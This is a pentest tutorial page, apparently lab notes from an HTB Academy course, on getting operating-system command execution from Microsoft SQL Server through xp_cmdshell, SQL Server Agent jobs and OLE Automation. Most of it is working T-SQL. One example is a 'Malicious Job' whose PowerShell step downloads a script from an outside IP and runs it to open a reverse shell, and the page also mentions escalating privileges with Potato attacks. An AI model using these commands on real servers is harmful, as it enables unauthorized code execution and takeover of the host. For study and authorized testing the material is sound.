---
title: 3. Command Execution
description: MSSQL server enumeration and exploitation series 
date: 2025-04-12 02:47:37 +/-0005
categories: [Active Directory, MSSQL]
tags: [Active Directory, MSSQL, RCE, HTB Academy]
---

<style>
  details {
    margin: 20px 0;
  }

  summary {
    font-weight: bold;
    cursor: pointer;
  }

  summary:hover {
    color: #007BFF;
  }

  ul {
    margin-left: 20px;
  }
</style>
---
* TOC
{:toc}

---

## üß® Command Execution Methods

MSSQL Server provides several ways to execute system-level commands, which attackers or penetration testers may leverage for post-exploitation. These include:

1. **Using `xp_cmdshell`**
2. **Creating malicious SQL Server Agent Jobs**
3. **Leveraging OLE Automation Procedures**

> ‚ö†Ô∏è **Important:** These features are usually disabled by default for security reasons. You must be a member of the sysadmin role to enable and use them.
> 
> ```sql
> EXEC sp_configure 'show advanced options', 1;
> RECONFIGURE;
> ```

## ‚úÖ Requirements
    
To perform command execution in MSSQL Server:

- You **must have `sysadmin` privileges** to enable advanced options or run high-privileged features.
- MSSQL Server **must allow enabling features like `xp_cmdshell`, Agent Jobs, or OLE Automation**.
- Ensure **the target MSSQL instance is configured and not hardened** (some servers disable or restrict these capabilities in production).
- For Agent Jobs: **The SQL Server Agent service must be running**.

## 1. üöÄ **Command Execution via `xp_cmdshell`**
    
`xp_cmdshell` is a built-in stored procedure that allows executing system commands directly via `cmd.exe` using T-SQL .

- **‚öôÔ∏è Requirements**
    - `sysadmin` privileges
    - `xp_cmdshell` must be enabled
- **üß± Steps to Enable `xp_cmdshell`**
    
    ```sql
    EXEC sp_configure 'show advanced options', 1;
    RECONFIGURE;
    EXEC sp_configure 'xp_cmdshell', 1;
    RECONFIGURE;
    ```
    
- **‚ñ∂Ô∏è Usage Example**
    
    ```sql
    EXEC xp_cmdshell 'ipconfig';
    ```
    
    ![image.png](https://file.notion.so/f/f/2ab6ea37-5cd9-465e-a988-79fae76207cd/d8d2d290-5050-43a7-9b8f-04fd70b7af39/image.png?table=block&id=1d385370-06ca-8010-9d49-e483a26be809&spaceId=2ab6ea37-5cd9-465e-a988-79fae76207cd&expirationTimestamp=1744516800000&signature=XvxhskhifqASfgvLMsPS9D0FaDLPen5f5y3ZYOx9d-k&downloadName=image.png)
    
    This spawns a `cmd.exe` process as a child of the `sqlservr.exe` process.
        
    ![image.png](https://file.notion.so/f/f/2ab6ea37-5cd9-465e-a988-79fae76207cd/a7ca6aca-56fa-4426-9664-29f18327a2e0/image.png?table=block&id=1d385370-06ca-8061-a4a2-c6c66ee8b379&spaceId=2ab6ea37-5cd9-465e-a988-79fae76207cd&expirationTimestamp=1744516800000&signature=wvt-hdaezBqsqsvmJFrLeDGlGOOBE_9_fD9pQl3btuc&downloadName=image.png)
        
    The command runs under the context of the SQL Server service account (e.g., `NT AUTHORITY\SYSTEM` or a custom SQL service account).
- **üßπ Cleanup:**
    
    To disable it again after use:
    
    ```sql
    EXEC sp_configure 'xp_cmdshell', 0;
    RECONFIGURE;
    EXEC sp_configure 'show advanced options', 0;
    RECONFIGURE;
    ```
        
## 2. üß® **Command Execution via SQL Server Agent Jobs**
    
SQL Server Agent Jobs are scheduled tasks used to automate database operations. If the SQL Server Agent service is running, jobs can be abused to execute arbitrary commands.

- **üß± Requirements**
    - **<span style="color: red;">SQL Server Agent service</span>** must be **running**.
    - User must have **sysadmin** rights.

- **üß™ Normal Agent Job**
    
    ```sql
    USE msdb;
    EXEC dbo.sp_add_job @job_name = N'MyJob';
    EXEC sp_add_jobstep 
        @job_name = N'MyJob',
        @step_name = N'SampleStep',
        @subsystem = N'TSQL',
        @command = N'ALTER DATABASE SALES SET READ_ONLY';
    ```
    
- **üë∑ Normal Job Creation Example**
    
    Weekly Sales Data Backup  runs once at 23:30:00
    
    ```sql
    USE msdb;
    EXEC sp_add_job @job_name = N'Weekly Sales Data Backup';
    EXEC sp_add_jobstep
        @job_name = N'Weekly Sales Data Backup',
        @step_name = N'Set DB ReadOnly',
        @subsystem = N'TSQL',
        @command = N'ALTER DATABASE SALES SET READ_ONLY',
        @retry_attempts = 5,
        @retry_interval = 5;
    EXEC sp_add_schedule
        @schedule_name = N'RunOnce',
        @freq_type = 1,
        @active_start_time = 233000;
    EXEC sp_attach_schedule
        @job_name = N'Weekly Sales Data Backup',
        @schedule_name = N'RunOnce';
    EXEC sp_add_jobserver @job_name = N'Weekly Sales Data Backup';
    ```
    
- **üí• Malicious Job using PowerShell Subsystem**
    
    SQL Server provides **`CmdExec`** and **`PowerShell`** subsystems that can be used to execute system commands and PowerShell scripts, respectively. 
    
    You can create a **SQL Server Agent job** with a step that uses the **PowerShell subsystem** to **download and execute a script** hosted on your machine.
    
    Instead of scheduling the job, you can start it immediately using the `sp_start_job` stored procedure.
    
    **To run a PowerShell script (e.g., for a reverse shell):**
    
    ```sql
    USE msdb;
    EXEC sp_add_job @job_name = N'Malicious Job';
    EXEC sp_add_jobstep 
        @job_name = N'Malicious Job',
        @step_name = N'Execute PowerShell Script',
        @subsystem = N'PowerShell',
        @command = N"(New-Object Net.WebClient).DownloadString('http://10.10.14.104/a') | IEX;";
    EXEC sp_add_jobserver @job_name = N'Malicious Job';
    EXEC sp_start_job @job_name = N'Malicious Job';
    ```
    
    The remote file `a` would typically contain a **PowerShell reverse shell** payload.
    
    ![image.png](https://file.notion.so/f/f/2ab6ea37-5cd9-465e-a988-79fae76207cd/4ea1f42f-2085-499a-b361-19da9d0367fb/image.png?table=block&id=1d385370-06ca-8032-b24b-d59e9012fd04&spaceId=2ab6ea37-5cd9-465e-a988-79fae76207cd&expirationTimestamp=1744516800000&signature=nI0Jp_T9KgpQ8qlgD1mFKhBUUEoiFKlyht9yaPEybqk&downloadName=image.png)
    
    **üö® Security Note**
    
    - SQL Server Agent often runs as `NT SERVICE\SQLSERVERAGENT`
    - This account typically holds **SeImpersonatePrivilege**, which can be escalated via **"Potato" attacks** to SYSTEM
- üßπ Cleanup:
    
    ```sql
    EXEC sp_delete_job @job_name = N'Malicious Job';
    ```
        
## 3. üéÆ  **Command Execution via OLE Automation Procedures**

OLE Automation allows executing Windows COM objects from T-SQL. This feature is disabled by default but can be enabled if you have `sysadmin` access.

It utilizes stored procedures such as `sp_OACreate` and `sp_OAMethod`.

Leverages OLE Automation allows T-SQL to interact with other languages like **VBScript** to run system commands.

For example, you can use it to create a `wscript.shell` object and execute **arbitrary system commands** directly from SQL Server.

- **‚öôÔ∏è Requirements**
    - `sysadmin` privileges
    - OLE Automation must be enabled
- **‚úÖ Enabling OLE Automation**
    
    ```sql
    EXEC sp_configure 'show advanced options', 1;
    RECONFIGURE;
    EXEC sp_configure 'ole automation procedures', 1;
    RECONFIGURE;
    ```
    
- **‚ñ∂Ô∏è Example Command Execution**
    
    
    ```sql
    DECLARE @objShell INT;
    DECLARE @output varchar(8000);
    EXEC sp_OACreate 'WScript.Shell', @objShell OUTPUT;
    EXEC sp_OAMethod @objShell, 'Run', NULL, 'cmd.exe /c "whoami > C:\Windows\Tasks\tmp.txt"';
    ```
    
    ![image.png](https://file.notion.so/f/f/2ab6ea37-5cd9-465e-a988-79fae76207cd/c971ee40-0378-447c-816c-1ee063207b8c/image.png?table=block&id=1d385370-06ca-8052-b538-eb19121bb3a3&spaceId=2ab6ea37-5cd9-465e-a988-79fae76207cd&expirationTimestamp=1744516800000&signature=QEc9tMBSts5vJzZyNX5KRaTeeL6ioQ33S9Cu0j05sWU&downloadName=image.png)
    
    - This will run `whoami` and save the output to a text file.
    - Useful when no direct output is needed and the file system is writable.
- **üß† Notes**
    - Uses COM objects (similar to VBScript)
    - Commands are executed using the SQL Server process's privileges
- **üßπ Cleanup**
    
    ```sql
    EXEC sp_configure 'ole automation procedures', 0;
    RECONFIGURE;
    EXEC sp_configure 'show advanced options', 0;
    RECONFIGURE;
    ```
    
- üîí Post-Exploitation Hygiene

After executing commands:

- Disable features you‚Äôve enabled (`xp_cmdshell`, OLE Automation)
- Remove malicious jobs (`sp_delete_job`)
- Audit logs and configuration
- Check for spawned processes using tools like Sysinternals Process Explorer or PowerShell

## üìå Summary Table For the used methods

| Method | Requires `sysadmin` | Needs Extra Config | External Service Needed | Can Run Arbitrary CMDs |
| --- | --- | --- | --- | --- |
| `xp_cmdshell` | ‚úÖ | Enable `xp_cmdshell` | ‚ùå | ‚úÖ |
| Agent Job (`CmdExec`/PS) | ‚úÖ | SQL Agent Running | ‚úÖ (SQL Server Agent) | ‚úÖ |
| OLE Automation | ‚úÖ | Enable `ole automation procedures` | ‚ùå | ‚úÖ |